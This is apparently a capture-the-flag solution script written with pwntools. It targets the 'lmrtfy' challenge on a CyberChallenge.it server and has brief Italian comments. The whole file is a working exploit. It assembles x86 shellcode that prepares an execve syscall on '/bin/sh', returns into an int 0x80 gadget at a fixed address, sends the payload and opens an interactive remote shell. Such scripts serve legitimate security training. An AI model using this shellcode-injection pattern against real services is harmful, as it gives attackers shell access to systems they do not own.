from pwn import *

exe = ELF("lmrtfy")

context.binary = exe


r = remote("lmrtfy.challs.cyberchallenge.it", 9124)

r.recvline()

# 0x08049444 int 0x80, utilizzato per eseguire la syscall

assembly = """
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
        add eax, 22
        mov ebx, eax
        mov eax, 0xb
        push 0x08049444
        ret
       """
# mov eax, 0xb -> 11 = execve
# 22 = len(shellcode)


shellcode = asm(assembly)

shellcode += b'/bin/sh\x00'

r.sendline(shellcode)

r.interactive()



